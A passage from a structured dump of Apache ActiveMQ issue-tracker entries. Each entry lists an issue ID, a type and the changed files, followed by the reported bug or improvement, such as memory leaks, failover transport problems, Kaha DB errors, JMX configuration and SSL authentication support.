If you have a durable subsciber that is not on-line, and you have producers sending message, eventually the server will hang on that topic.I have attached a zip file with a junit test case and my activemq configuration.  The test case has two tests, one that creates a durable subscription, that will succeed, and a second that starts publishing up to 100000 events, which will hang.  I don"t really know how to interrupt the all, so the test case never finishes.  Anyway, it does show the problem and is 100% repeatable on my system.The config file is set to use a SQLServer database, but the stock journal or a derby persistence manager will do the same thing.  I just switched to mssql server because I can then see what is going on in the database.  And records are being added to the database all the way up to when the server hangs. I also doubled the memory manager limit and moved the jmx rmi port to 1080 since I have another server running at 1099.
issueID:AMQ-846
type:Improvement
changed files:
texts:Change the maven pom group id to org.apache.activemq and the version to be 4.1-incubator-SNAPSHOT
None
issueID:AMQ-847
type:Bug
changed files:
texts:Memory Leaks
1) factoryStats in the connection factory was holding on to connections even when they are closed.2) peer BrokerInfos were never removed even when the peer disconnected.3) messages dispatched from a Queue would retain a referece to the client connection even after they had been acked.4) ScheduledThreadPoolExecutor does not always seem to release references to canceled tasks
issueID:AMQ-849
type:Bug
changed files:Message.java
texts:Not all properties of the Message are copied during a call to Message.copy(Message)
Noticed that when using copyOnSend feature and compression, sent messages were not being compressed. It was then found that this was due to the fact that the connection that is used to determine whether compression should be performed or not, was null for the copied message. A look into the Message found that the connection and a number of other properties of the Message were not copied in the copy(Message) The patch attached copies the remaining properties of the Message to the message copy.
issueID:AMQ-851
type:Improvement
changed files:JAXPXPathEvaluator.java
pom.xml
XMLBeansXPathEvaluator.java
texts:move the XPath filtering components out of the activemq-core module into activemq-optional to reduce the dependencies of the activemq-core POM to only minimal stuff
to remove dependencies on things like JAXP1.3, jaxen,  xmlbeans etc
issueID:AMQ-853
type:Improvement
changed files:BrokerFactoryBean.java
texts:Make BrokerFactoryBean use pre-existing app context as parent
I"ve made a local enhancement to the BrokerFactoryBean to make it where your activeMQ XML configuration files refer to beans configured in your Spring application context. Basically I just made the BrokerFactoryBean implement ApplicationContextAware so the ApplicationContext will be set, then in afterPropertiesSet() when it"s creating the context for the config resource location, it does this:context = new ResourceXmlApplicationContext(config, applicationContext)passing in the Spring application context as the parent application context for the ResourceXmlApplicationContext.I did this for myself so I could use the same DataSource as the backing DataSource for JDBC persistence.
issueID:AMQ-854
type:Improvement
changed files:
texts:Update to activemq-cpp source to enable documentation generation
This patch contains updated source files for the activemq-cpp project which expand the code documentation and clean up documentation that caused warnings when running the doxygen tool to document the code.  A set of generated documentation files is included in the new docs folder.  This patch adds no new functionality.
issueID:AMQ-855
type:New Feature
changed files:ActiveMQMessageConsumer.java
texts:Add support for prefetchSize = 0
This feature would enable to support following test case:2 servers are processing 3 submitted jobs with following processing times 10 min, 1 min, 1 min. This sequence should finish in 10 minutes as one service will pick up the 10 minutes job, meanwhile the other one should manage the two 1 minute jobs. Since I cannot set prefetchSize=0, one of the 1 minute jobs is sitting in prefetch buffer and the jobs are processed in 11 minutes instead of 10.This is simplification of the real scenario where I have about 30 consumers submitting jobs to 20 consumers through AMQ 4.0.1. I have following problems: Messages are sitting in prefetch buffer are not available to processors, which results in a lot of idle time. Order of processing is random. For some reason Job # 20 is processed after Job # 1500. Since senders are synchronously blocked this can result in time-outs. Some requests are real-time, i.e. there is a user waiting, so the system cannot wait, so AMQ-850 does not fix this issue.
issueID:AMQ-856
type:Wish
changed files:ActiveMQEndpointWorker.java
texts:log "Endpoint connection to JMS broker failed: ..." on error level
After the ActiveMQEndpointWorker fails several times to reconnect to a broker and reaches the MAX_RECONNECT_DELAY this error is logged on INFO level.log.info("Endpoint connection to JMS broker failed: " + error.getMessage(); (line 244 in org.apache.activemq.ra.ActiveMQEndpointWorker.java)This should be logged on the ERROR level, because this may denote a critical configuration or connectivity error in a distributed system that should be easily detectable by a production monitoring system.
issueID:AMQ-857
type:New Feature
changed files:DataManager.java
KahaPersistenceAdapter.java
KahaStore.java
Store.java
texts:Make kaha DB file size configurable
As I understand file size is set fixed to 32MB (http://www.nabble.com/forum/ViewPost.jtp?post=5285163&framed=y).and I did not find a JIRA for it. I am creating it, just to make sure it is not forgotten.If possible it would be great if wiki (http://www.activemq.org/site/kaha-persistence.html) was updated to explain when those queue-data files are rolled-over and removed, because people will be asking . Thanks.
issueID:AMQ-858
type:Bug
changed files:pom.xml
GramMojo.java
BundleMojo.java
texts:create a super pom for tooling projects in activemq so we can create a nightly build of the various maven plugins
We need to move all the m2 plugins under tooling/ (they nearly all are) then create a pom.xml there for building all the tooling plugings.Folks from there can then do "mvn clean install" to build and install all the m2 plugins. We can then create a nightly build of the m2 plugins easily.(Right now plugins are not always auto-downloaded when folks try to use stuff in say activemq-perftest module)....e.g.macstrac:/workspace/eclipse/activemq jstrachan$ cd activemq-perftest/macstrac:/workspace/eclipse/activemq/activemq-perftest jstrachan$ mvn activemq-perf:broker&#91;INFO&#93; Scanning for projects...&#91;INFO&#93; Searching repository for plugin with prefix: "activemq-perf".&#91;INFO&#93; org.apache.maven.plugins: checking for updates from apache-snapshots&#91;INFO&#93; org.codehaus.mojo: checking for updates from apache-snapshots&#91;INFO&#93; artifact org.apache.maven.plugins:maven-compiler-plugin: checking for updates from apache-snapshots&#91;INFO&#93; snapshot org.apache.maven.plugins:maven-compiler-plugin:2.1-SNAPSHOT: checking for updates from apache-snapshots&#91;INFO&#93; artifact org.apache.maven.plugins:maven-eclipse-plugin: checking for updates from apache-snapshots&#91;INFO&#93; snapshot org.apache.maven.plugins:maven-eclipse-plugin:2.3-SNAPSHOT: checking for updates from apache-snapshots&#91;INFO&#93; snapshot org.apache.maven.plugins:maven-plugins:2-SNAPSHOT: checking for updates from apache-snapshots&#91;INFO&#93; artifact org.apache.activemq:maven-activemq-memtest-plugin: checking for updates from apache-snapshots&#91;INFO&#93; artifact org.apache.activemq:maven-activemq-memtest-plugin: checking for updates from central&#91;INFO&#93; ------------------------------------------------------------------------&#91;ERROR&#93; BUILD ERROR&#91;INFO&#93; ------------------------------------------------------------------------&#91;INFO&#93; The plugin "org.apache.activemq:maven-activemq-memtest-plugin" does not exist or no valid version could be found&#91;INFO&#93; ------------------------------------------------------------------------&#91;INFO&#93; For more information, run Maven with the -e switch&#91;INFO&#93; ------------------------------------------------------------------------&#91;INFO&#93; Total time: 13 seconds&#91;INFO&#93; Finished at: Thu Aug 03 02:55:57 BST 2006&#91;INFO&#93; Final Memory: 3M/5M&#91;INFO&#93; ------------------------------------------------------------------------
issueID:AMQ-859
type:Improvement
changed files:
texts:nightly snapshots to include source distro
None
issueID:AMQ-871
type:Improvement
changed files:OldestMessageEvictionStrategy.java
OldestMessageWithLowestPriorityEvictionStrategy.java
TopicSubscription.java
MessageEvictionStrategy.java
texts:Allow MessageEvictionStrategy to evict more than one MessageReference in evictMessage(LinkedList message) method
For slow consumers every time a single message is added to a TopicSubscription where the pending message limit is reached, a new call to evictMessage is made. To allow for more flexible and efficient means of evicting messages it would be nice to be able to evict multiple messages in one call to evictMessage. This allows new MessageEvictionStrategy implementations to evict based on age of messages (eg. evict all messages in the pending message list that are older than x ms), duplicate messages (evict all messages that are redundant based on newer messages currently in the pending message list) etc. As a single call to the evictMessage method may have the opportunity to reduce the size of the pending message list by more than one it means that the next message added to the TopicSubscription may not need to have to call the evictMessage again.
issueID:AMQ-872
type:Bug
changed files:TransportConnector.java
texts:Don&#39;t monitor activity on vm transports
currently all transport servers montitor transport channels for activity - closing down blocked transports. This can occassionally result in  stranged side-affects for  networks - which use an inbound vm:// channel to the broker in their communications
issueID:AMQ-874
type:Bug
changed files:
texts:The Activemq-cpp example code no longer builds.
Code in the Activemq-cpp example is no longer up to date with the latest version.  We need to clean this code up to match the samll changes in the CMS interface.
issueID:AMQ-876
type:Bug
changed files:
texts:Kaha DB cannot locate queue data files
Keep getting exception below.  Note that you are looking for queue-data-1, but actual file name is data-queue-data-1$ pwd  /cygdrive/d/amq/activemq-kaha/kaha.db$ lsdata-kaha-1  data-queue-data-1  index-kaha  index-queue-data  index-transactionsjavax.jms.JMSException: java.io.IOException: Could not locate data file queue-data-1        at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:46)        at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1154)        at org.apache.activemq.TransactionContext.commit(TransactionContext.java:260)        at org.apache.activemq.ActiveMQSession.commit(ActiveMQSession.java:464)        at com.barra.cp.common.io.MultiQueueReceiver.onMessage(MultiQueueReceiver.java:163)        at com.barra.cp.common.io.SingleMessageMultiQueueReceiver$OneMessageAtATime.runMultiQueue(SingleMessageMultiQueueReceiver.java:176)        at com.barra.cp.common.io.SingleMessageMultiQueueReceiver$OneMessageAtATime.doRun(SingleMessageMultiQueueReceiver.java:143)        at com.barra.cp.common.io.SingleMessageMultiQueueReceiver$OneMessageAtATime.run(SingleMessageMultiQueueReceiver.java:124)        at java.lang.Thread.run(Unknown Source)Caused by: org.apache.activemq.kaha.RuntimeStoreException: java.io.IOException: Could not locate data file queue-data-1        at org.apache.activemq.kaha.impl.MapContainerImpl.getValue(MapContainerImpl.java:340)        at org.apache.activemq.kaha.impl.MapContainerImpl.remove(MapContainerImpl.java:265)        at org.apache.activemq.store.kahadaptor.KahaMessageStore.removeMessage(KahaMessageStore.java:68)        at org.apache.activemq.store.kahadaptor.KahaTransaction.commit(KahaTransaction.java:92)        at org.apache.activemq.store.kahadaptor.KahaTransactionStore.commit(KahaTransactionStore.java:95)        at org.apache.activemq.transaction.LocalTransaction.commit(LocalTransaction.java:68)        at org.apache.activemq.broker.TransactionBroker.commitTransaction(TransactionBroker.java:154)        at org.apache.activemq.broker.BrokerFilter.commitTransaction(BrokerFilter.java:92)        at org.apache.activemq.broker.BrokerFilter.commitTransaction(BrokerFilter.java:92)        at org.apache.activemq.broker.MutableBrokerFilter.commitTransaction(MutableBrokerFilter.java:102)        at org.apache.activemq.broker.AbstractConnection.processCommitTransactionOnePhase(AbstractConnection.java:330)        at org.apache.activemq.command.TransactionInfo.visit(TransactionInfo.java:99)        at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:228)        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:63)        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:92)        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:67)        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:123)        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:123)        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:88)        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:127)        ... 1 moreCaused by: java.io.IOException: Could not locate data file queue-data-1        at org.apache.activemq.kaha.impl.DataManager.getDataFile(DataManager.java:117)        at org.apache.activemq.kaha.impl.StoreDataReader.readItem(StoreDataReader.java:62)        at org.apache.activemq.kaha.impl.DataManager.readItem(DataManager.java:121)        at org.apache.activemq.kaha.impl.MapContainerImpl.getValue(MapContainerImpl.java:337)        ... 20 more
issueID:AMQ-877
type:Improvement
changed files:
texts:Patch: refactoring to allow alternative (using different storage interface) Destinations implementations.
We were looking at alternate message persistence mechanisms that can co-exist in current ActiveMQ code base and we are thinking of a mechanism that is somewhat incompatible with the current MessageStore and PersistenceAdapter APIs. Unfortunately, the current ActiveMQ broker doesn"t allow for such a change as the PersistenceAdapter and MessageStore interfaces are referenced directly by the RegionBroker and by both the Queue and Topic region implementations. Therefore, we are proposing a relatively small backwards compatible refactoring of the broker code that would eliminate all dependencies on the PersistenceAdapter and MessageStore interfaces from those classes that do not use them directly. This refactoring would also allow creation of a custom Destination implementation that may use an alternative persistence mechanism on a destination by destination basis (which is exactly what we need to do). The main idea behind the refactoring is to replace many references to PersistenceAdapter with a new interface: DestinationFactory: public abstract class DestinationFactory {  abstract public Destination createDestination(ConnectionContext context, ActiveMQDestination destination, DestinationStatistics destinationStatistics) throws Exception; abstract public Set getDestinations();  abstract public SubscriptionInfo[] getAllDurableSubscriptions(ActiveMQTopic topic) throws IOException;  abstract public long getLastMessageBrokerSequenceId() throws IOException;  abstract public void setRegionBroker(RegionBroker regionBroker);  }  Note that DestinationFactory doesn"t mandate any specific persistence mechanism. The classes that would reference it instead of PersistenceAdapter are: RegionBroker, AbstractRegion, QueueRegion, and TopicRegion. Also, the AbstractRegion.createDestination method would be changed from abstract to an implementation that uses DestinationFactory to create a destination. BrokerService could be changed to use DestinationFactory if one is provided. If none is provided, it will create a DestinationFactory implementation that instantiates Queue and Topic using PersistenceAdapter as it does currently. Hence, full backwards compatibility will be maintained.Patch is attached.
issueID:AMQ-883
type:Bug
changed files:
texts:NMS asynchronous consumption of queued messages
1.  Several messages are sent to a queue2.  NMS client subscribes 3.  Queued messages are not received by NMS client4.  Another message is sent to the queue (while the NMS client is subscribed)5.  NMS client receives all messagesSame setup using Java publisher and subscriber behaves properly (queued messages are sent to the subscriber immediately).  Editting the AsyncConsumeTest unit test can reproduce the problem and cause the test to fail:In the textMessageSRExample test, move the consumer logic below the producer logic.  (I.e. have the message sent to a queue before the consumer subscribes).
issueID:AMQ-884
type:Bug
changed files:
texts:Ajax should support non-XML messages
_amq.js should not make an assumption that the received message is in XML format.I"m using a plain text message and it was not being handled to my handler.The user handler must be aware of the type of object it receives.Patch below.Index: _amq.js===================================================================&#8212; _amq.js (revision 419888)+++ _amq.js (working copy)@@ -46,11 +46,7 @@             {               for (var j = 0; j < responseElement.childNodes.length; j++)               { var child = responseElement.childNodes&#91;j&#93; if (child.nodeType == 1) {-                  handler(child);-                }+                handler(responseElement.childNodes&#91;j&#93;);        }             }           }
issueID:AMQ-886
type:Bug
changed files:DemandForwardingBridge.java
DemandForwardingBridgeSupport.java
CompositeDemandForwardingBridge.java
texts:Timing bug could cause duplicate client id exception in network code.
None
issueID:AMQ-887
type:New Feature
changed files:
texts:Allow temp destination message bridging to be disable across demand based bridges.
None
issueID:AMQ-888
type:Bug
changed files:
texts:Licence headers missing from several source files.
robert burrell donkin reported:missing license headers from some of the files i checked at randomgives me concerns. for example:maven-bundle-plugin/src/main/java/org/apache/activemq/maven/BundleMojo.javaactivemq-web-demo worries me: there are a lot of files without licenseheaders and some which have them were not created at the ASF (which isok but gives me concerns about the rest).i would like to see the issue of licenses in the source tidied upbefore this release ships. i haven"t gone through every file but IMOthis needs to be done.
issueID:AMQ-889
type:Bug
changed files:
texts:Broker &#39;loses&#39; messages and leaks resources when handling duplicate connections
A client that uses a transport like the failover transport can damage the broker"s ability to deliver messages to other clients and ultimately cause broker resource leaks and message loss. I"ve found 4 issues starting on the client and ending on the broker that could be improved to make the situation a lot better. In this issue I"ve provided a patch for #3.1) A failover client stores session metadata commands like ConsumerInfo in a local state tracker. When failover occurs it replays these commands verbatim to the newly connected-to broker. If the failover transport fails back to the original broker it will replay the same commands with the same ids as it already sent the broker. If the failover happens before the broker notices the old connection has gone this can result in bad mojo. Clients should probably regenerate session, consumer, and maybe connection ids.2) When the broker detects a duplicate ClientId being sent to it it throws an exception saying so, but this does not stop the broker from processing subsequent messages on that connection. The broker should tear down the connection immediately when it sees a client thrashing about.3) When a broker receives a certain series of ConsumerInfo add and remove commands with the same ConsumerId it leaks resources. One of the resources leaked is the knowledge of lock owners on messages out in prefetch buffers. This means those messages are stuck forever on the broker and can never be retrieved and never be gc()ed. More below.4) Messages locked and out in prefetch buffers have no broker-side timeout. If a consumer is up, saying hello to the inactivity monitor, but otherwise doing nothing then its messages are locked forever. The broker should have a janitor that redrives stale messages. This seems like the hardest of the 4 to fix, but is one of the most important.More on #3: One bad sequence of events is:1) Consumer "c" connects to the broker over a failover transport. 2) c subscribes to a queue and addConsumer() gets called. 3) c fails away and then fails back.4) c replays ConsumerInfo to the broker. addConsumer() gets called again and overwrites subscription tracking from the first.After this the broker will eventually get a double remove and there will be noisy JMX complaints etc., but the serious problem has already occurred in step 4. My patch synchronizes the add step so that the  broker is protected. The individual client will still be a bit confused, and there will still be noise when the second remove comes and JMX can"t find the consumer to remove, but the resource and message leaks are taken care of.I"ll file issues on the other 3 problems if they sound valid to you and aren"t already entered.
issueID:AMQ-890
type:Bug
changed files:
texts:JMX purge() fails with a ConcurrentModificationException
I think this must be an issue running under jdk 1.5 only. It shows up on Mac OS X and Linux 1.5 jvms. Remove and gc() were stumbling over each other and invalidating the iterator. I broke them apart a bit to avoid the exception. Thanks to Alan Robbins for help tracking this down.
issueID:AMQ-891
type:Bug
changed files:NetworkConnector.java
ActiveMQInputStream.java
DemandForwardingBridgeSupport.java
DedicatedTaskRunner.java
FailoverTransport.java
JournalPersistenceAdapter.java
ActiveMQSession.java
ActiveMQSessionExecutor.java
ActiveMQMessageConsumer.java
WireFormatNegotiator.java
UdpTransport.java
FanoutTransport.java
ActiveMQConnection.java
SimpleDiscoveryAgent.java
QuickJournalPersistenceAdapter.java
texts:InterruptedException handling tweaks
There were a few spots where the broker was masking the interrupt state after handling an InterruptedException. This is a lint pass to clean some of that up. I learned after I made this patch that it"s actually slightly better stylistically to call Thread.interrupt() instead of Thread.currentThread().interrupt() since it"s static and the interrupt state is global(ish), but this is the version we"ve tested.
issueID:AMQ-892
type:Improvement
changed files:ManagementContext.java
texts:Allow the JMX RMI server port to be hard set
When debugging a broker over the firewall with JMX it"s often necessary to use ssh tunneling. JMX uses 2 ports. The RMI registry port is what is typically configured, but JMX also runs an RMI server on a different port-- one that"s typically chosen randomly. When you"re ssh tunneling you need to know what ports to tunnel to a priori so this is no good.This patch adds a setting to allow the RMI server port to be set in addition to the registry port. This is what it looks like in xml:    <managementContext connectorPort="11099" rmiServerPort="11119" jmxDomainName="org.apache.activemq"/>Also I snuck in a one-liner change that will create the connector if the user configured jmx. This seems like the right thing to do, but my JMX experience is pretty limited so it could break in something like Tomcat. Please take a close look at that line before applying.
issueID:AMQ-893
type:Bug
changed files:JDBCPersistenceAdapter.java
DefaultDatabaseLocker.java
texts:on solaris you cannot easily kill a slave broker when using JDBC Master Slave
Seems to hang in a tight loop
issueID:AMQ-894
type:Improvement
changed files:ConnectorView.java
TransportConnector.java
BrokerView.java
BrokerService.java
BrokerViewMBean.java
Topic.java
ConnectorStatistics.java
Queue.java
ConnectorViewMBean.java
DestinationStatistics.java
CountStatisticImpl.java
ConnectionStatistics.java
texts:Provide option to turn on//off AMQ statistics gathering
The option to turn off/on AMQ statistics gathering for use in a production system is desirable. The "useJmx" flag only stops the exposure of the management interfaces for these statistics. The Broker Mbean interface shall provide a method to start/stop statistics gathering  The Broker URI shall include statisticsEnabled option.
issueID:AMQ-895
type:Bug
changed files:JmsTopicConnector.java
JmsQueueConnector.java
JmsConnector.java
DestinationBridge.java
TopicBridge.java
QueueBridge.java
texts:JMS to JMS Bridge never reconnects under remote broker restarts.
I"m using ActiveMQ (4.0.1) JMS to JMS Bridge functionality to connect to a  SunMQ JMS Broker (3.6 SP3  (Build 02-A)). I"m using two queues, an input and an output one, with the following configuration:    <jmsBridgeConnectors>      <jmsQueueConnector outboundQueueConnectionFactory="#REMOTE">      <outboundQueueBridges>        <outboundQueueBridge outboundQueueName="SUNRECV"/>      </outboundQueueBridges>      <inboundQueueBridges>        <inboundQueueBridge inboundQueueName="SUNSEND"/>      </inboundQueueBridges>      </jmsQueueConnector>    </jmsBridgeConnectors>The system works really well until the SunMQ broker needed to be restarted. This is what I found:1.-ActiveMQ is not aware of the remote broker shutdown. I waited for a while, but no log on ActiveMQ indicates knowledge about the new situation.2.-When I send a message to the output queue SUNRECV, ActiveMQ complains that the producer is closed:&#91;ERROR&#93;&#91;2006/08/25.09:47:12.039&#93;&#91;ActiveMQ Session Task&#93;failed to forward message: ActiveMQTextMessage {commandId = 5, responseRequired = false, messageId = ID:trabucco-43457-1156491843149-3:4:1:1:1, originalDestination = null, originalTransactionId = null, producerId = ID:trabucco-43457-1156491843149-3:4:1:1, destination = queue://SUNRECV, transactionId = null, expiration = 0, timestamp = 1156492032027, arrival = 0, correlationId = null, replyTo = null, persistent = false, type = null, priority = 0, groupID = null, groupSequence = 0, targetConsumerId = null, compressed = false, userID = null, content = null, marshalledProperties = null, dataStructure = null, redeliveryCounter = 0, size = 2, properties = null, readOnlyProperties = true, readOnlyBody = true, text = 1}(&#91;C4064&#93;: Cannot perform operation, producer is closed.) After this, it is automatically queueing messages without sending them, showing the log:&#91;DEBUG&#93;&#91;2006/08/25.09:47:42.721&#93;&#91;RMI TCP Connection(4)-10.95.89.20&#93;No subscriptions registered, will not dispatch message at this time. Even if SunMQ is started again, ActiveMQ is not detecting the new situation, and continues queueing messages sent to SUNRECV.Please, make me know if more information is needed to understand the situation.
issueID:AMQ-896
type:New Feature
changed files:
texts:allow messages to be copied, moved or deleted using a JMS selector
None
issueID:AMQ-901
type:Bug
changed files:
texts:Error executing build on activemq-core.
Below is the exception thrown.&#8212; Nested Exception &#8212;com.thoughtworks.qdox.parser.ParseException: syntax error @&#91;90,25&#93; in file:/D:/logicblaze/working-source/activemq/activemq-core/src/main/java/org/apache/activemq/network/jms/JmsConnector.java        at com.thoughtworks.qdox.parser.impl.Parser.yyerror(Parser.java:611)        at com.thoughtworks.qdox.parser.impl.Parser.yyparse(Parser.java:719)This exception is due to the version of maven-xbean-plugin used.
issueID:AMQ-902
type:Bug
changed files:HttpsTransportServer.java
texts:Exception thrown when compiling activemq-optional.
The exception below is thrown when compiling activemq-optional."&#91;WARNING&#93; Unable to get resource from repository central (http://ibiblio.org/maven2/)&#91;INFO&#93; &#91;compiler:compile&#93;Compiling 12 source files to D:logicblazeworking-sourceactivemqactivemq-optional	argetclasses&#91;INFO&#93; ------------------------------------------------------------------------&#91;ERROR&#93; BUILD FAILURE&#91;INFO&#93; ------------------------------------------------------------------------&#91;INFO&#93; Compilation failureD:logicblazeworking-sourceactivemqactivemq-optionalsrcmainjavaorgapacheactivemq	ransporthttpsHttpsTransportServer.java:&#91;51,36&#93; cannot find symbolsymbol  : method setAlgorithm(java.lang.String)location: class org.mortbay.jetty.security.SslSocketConnector"--------------------------------------------------------------------------------There was an update made on jetty dependency version from 6.0.0rc0 to 6.0.0rc2 wherein the method "setAlgorithm(String)" of "org.mortbay.jetty.security.SslSocketConnector" was changed to a more specific methods "setSecureRandomAlgorithm(String), setSslKeyManagerFactoryAlgorithm(String) and setSslTrustManagerFactoryAlgorithm(String)". This change caused the class "HttpsTransportServer." to throw an exception since it can no longer find the "setAlgorithm(String)" method.
issueID:AMQ-906
type:Bug
changed files:
texts:Exception does not lead to redelivery for AUTO_ACKNOWLEDGE
I have a message driven pojo configured configured with with auto_acknowledge, nontransactional and some persistent message in a queue. All my mdp does it to throw new RuntimeException("please retry") but unfortunately the messages are not retried:SEVERE: error dispatching message: java.lang.RuntimeException: Please retry at net.activem.jms.ExceptionTestOutboundMdp.onMessage(ExceptionTestOutboundMdp.java:46) at org.jencks.LocalTransactionEndpoint.onMessage(LocalTransactionEndpoint.java:68) at org.apache.activemq.ra.MessageEndpointProxy$MessageEndpointAlive.onMessage(MessageEndpointProxy.java:120) at org.apache.activemq.ra.MessageEndpointProxy.onMessage(MessageEndpointProxy.java:60) at org.apache.activemq.ActiveMQSession.run(ActiveMQSession.java:692) at org.apache.activemq.ra.ServerSessionImpl.run(ServerSessionImpl.java:163) at org.apache.geronimo.connector.work.WorkerContext.run(WorkerContext.java:291) at EDU.oswego.cs.dl.util.concurrent.PooledExecutor$Worker.run(Unknown Source)Looking in the ActiveMQ source code I think the problem might be in these lines:            try {                 messageListener.onMessage(message);            } catch ( Throwable e ) {                  // TODO: figure out proper way to handle error.                log.error("error dispatching message: ",e);                connection.onAsyncException(e);            } at java.lang.Thread.run(Thread.java:595)found in org.apache.activemq.ActiveMQSession.According to JMS spec, I"d say that with auto_ack a msg should be retried in case the message listener throws an exception, even if the operation is non-transactional:http://java.sun.com/j2ee/1.4/docs/api/javax/jms/Session.html#AUTO_ACKNOWLEDGEpublic static final int AUTO_ACKNOWLEDGE    With this acknowledgment mode, the session automatically acknowledges a client"s receipt of a message either when the session has successfully returned from a call to receive or when the message listener the session has called to process the message successfully returns.
issueID:AMQ-907
type:Improvement
changed files:
texts:Make the ActiveIO dependency and optional dependency.
Need to move some core classes that are in activeio to activemqso that it is not needed to run.  Right now the only realfunctionality that it provides that is optional is the journalimplementation.Everything else that is use from activeio are just abstract interfaces, and I thinkthose need to be moved/copied to ActiveMQ.
issueID:AMQ-908
type:Improvement
changed files:AuthorizationEntry.java
texts:Authorization plugin should have configurable principal classes
Currently, if you configure the authorization plugin, it assumes that all principals listed should be of type org.apache.activemq.jaas.GroupPrincipal.  This is OK if you"re using ActiveMQ LoginModules, but since there"s a fairly small supply of those, it would be great if you could use arbitrary login modules and tell the authorization plugin which principal classes to use.  For example, groupClass="weblogic.security.principal.WLSGroupImpl or something like that.  A good first step would be to let you change the group class.  A good second step would be to let you specify user and group classes and then somehow indicate which names are which (e.g. admin="administrators,user:aaron,user:bob" or whatever).  Someday maybe it will be nice to support any arbitrary combination of principal classes but that seems far away.When instantiating the principal classes, I imagine we should use a constructor with a single String argument if available, or else a default constructor plus a "setName" method, or else I guess bail.
issueID:AMQ-910
type:Improvement
changed files:RedeliveryPolicy.java
texts:backoffMultiplier should be a double value
Having org.apache.activemq.ra.ActiveMQActivationSpec.backOffMultiplier as a short value is too limiting. I think a double value would be more appropriate. For instance, I"d like to set it to about 1.1 but that"s not possible at the time being.
issueID:AMQ-911
type:Bug
changed files:RegionBroker.java
AbstractConnection.java
ConnectionContext.java
texts:Transient connection failure with Failover transport can cause InvalidClientIDException
It shows up as errors on the broker log:Error occured while processing sync command: javax.jms.InvalidClientIDException: Broker: localhost - Client: ID:hchirino-mac.local-51624-1157486953862-2:0 already connected
issueID:AMQ-912
type:Improvement
changed files:JassCredentialCallbackHandler.java
JaasAuthenticationBroker.java
JassCredentialCallback.java
texts:ActiveMQ support for SSL authentication and authorization
This patch adds new Transports, Brokers, and Plugins needed for authentication and authorization based on SSL certificates.It also adds a few unit tests for the mentioned classes.The new (or heavily modified) SslTransport, SslTransportServer, and SslTransportFactory classes allow for access to the underlying socket"s need and want client auth settings. If a certificate is found, it is set as the transportContext of the created connection.The JaasCertificateAuthenticationBroker uses the new CertificateLoginModule to authenticate certificates (this class is abstract to allow for different backends for certificate authentication, a concrete class is TextFileCertificateLoginModule).JaasCertificateAuthenticationBroker also sets the security context"s user name to that provided for the certificate by the login module. This allows for authorization using the existing authorization broker.
issueID:AMQ-913
type:Bug
changed files:OpenWireFormat.java
texts:Wireformat negociation needs to negociate to to the minimum version supported by both sides.
Right now it"s negociating to the maximum supported by both sides.  This means that old version will try to load a newer version of the wireformat that it does not support!
issueID:AMQ-915
type:Bug
changed files:ConnectionState.java
ConnectionStateTracker.java
FailoverTransport.java
AbstractConnection.java
SessionState.java
FanoutTransport.java
ProducerState.java
texts:Failover transport does not replay all the transaction operations on failover.
If transactions are being used on a connection that is using failover.. these is a small chance that the transaction will fail or the connection will fail due to a partial tx being run when the client reconnects.I will change the failover transport to buffer up all the tx operations that are run against the broker and on failure, replay those operations.
issueID:AMQ-918
type:Bug
changed files:TcpTransport.java
AbstractConnection.java
TransportConnection.java
texts:Inactivity Monitor timeout does not on disconnected client does not cause blocked dispatch to client to fail.
The cause is that inactivity timeout cause an async thread to call TransportConnection.stop()  but it in turn tries to do a "transport.oneway(new ShutdownInfo());" before a transport.stop();Since another thread is currently stuck in the oneway() call (due to the client having disconnected but the OS has not thrown an IOException up to us yet), our ShutdownInfo message blocks too.  So in essence the InactivityMonitor is not currently shutitng down the failed connections.
issueID:AMQ-920
type:Improvement
changed files:DemandForwardingBridgeSupport.java
TransportConnection.java
texts:Two TCP connection requirement for bidirectional message flow ...
We noticed the following during our testing ....When a broker A establishes connection to broker B, the message flow is unidirectional from A to B.This is a an issue for us: For example, consider brokers associated with business critical services X and Y. There are many secondary services that either monitor/feed off of the messages coming from them.A FOO service would like to process messages going from X to Y. So in FOO"s broker configuration we add X"s name. However,  messages are not going to flow from X to FOO, till X initiates a connection to FOO. It may not be desirable/possible to change business critical brokers" configuration for usage scenarios like this.TCP is bidirectional and asymmetry at connection establishment should not be translated to the higher level network connector. Is there a fundamental need/justification for this design that I may not be aware of ? Otherwise I would like to explore other design options.ThanksRegards Sridhar Komandur
issueID:AMQ-922
type:Improvement
changed files:
texts:Add the ability to remove transport connectors dynamically
Add a removeConnector() to BrokerServer to remove added transport connectors.
issueID:AMQ-927
type:Bug
changed files:
texts:Default log4j.properties has stdout enabled and not the out file appender
The default log4j.properties has:log4j.rootLogger=INFO, stdoutand then goes on to say:# CONSOLE appender not used by defaultlog4j.appender.stdout=org.apache.log4j.ConsoleAppender..And it also has this header... which is misleading:## The logging properties used during tests..#Also not sure why this would be in data... nor do I ever see this being created, even when out is enabled...log4j.appender.out.file=${activemq.home}/data/activemq.log
issueID:AMQ-928
type:Bug
changed files:
texts:Topic subscriber count is incorrect, shows up as negative (JMX)
In JMX console:1. create 2 topics & with 1 durable subscriber each topic subscriber count is still at 02. remove 1 of the subscribers subscriber count for both topics is now at -1
issueID:AMQ-932
type:Bug
changed files:TransportConnection.java
ManagedTransportConnection.java
texts:Quickly broken client connections lead to memory leaks
